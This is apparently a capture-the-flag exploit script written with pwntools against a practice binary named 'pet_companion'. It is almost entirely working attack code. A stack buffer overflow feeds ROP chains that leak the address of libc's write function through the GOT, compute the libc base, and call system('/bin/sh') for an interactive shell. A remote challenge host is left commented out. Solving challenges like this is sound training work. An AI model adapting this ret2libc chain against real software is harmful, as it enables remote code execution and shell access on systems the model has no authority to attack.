from pwn import *
context.log_level='debug'
elf = ELF('./pet_companion')
io = process('./pet_companion')
io = gdb.debug('./pet_companion')
#io = remote('94.237.54.152',51111)
padding = 72
pop_rdi = 0x0000000000400743 #: pop rdi ; ret
pop_rsi = 0x0000000000400741 #: pop rsi ; ret
payload = b'A'*padding+p64(pop_rsi)+p64(elf.got['write'])+p64(1)+p64(elf.plt['write'])+p64(0x40064a)
#control register rdi,rsi by stack overflow,ROP_chain like `write(1,write_got_addr,?)` and end jump to main_function

io.sendlineafter(b'status:',payload)
io.recvuntil(b'Configuring...\n\n')
a = u64(io.recv(6).ljust(8,b'\x00'))
#received write_got_addr and packed it
print('addr',hex(a))

base_offset = a-0x5555555100f0              #get Lib['write'],Lib['system'],Lib['/bin/sh'] from ./glibc/libc.so.6 by gdb
sys_addr = base_offset+0x55555544f420
bin_sh = base_offset+0x5555555b3d88

payload1 = b'A'*padding+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
#make ROP_chain like `system('/bin/sh')` then you will get shell
io.sendlineafter(b'status:',payload1)

io.interactive()
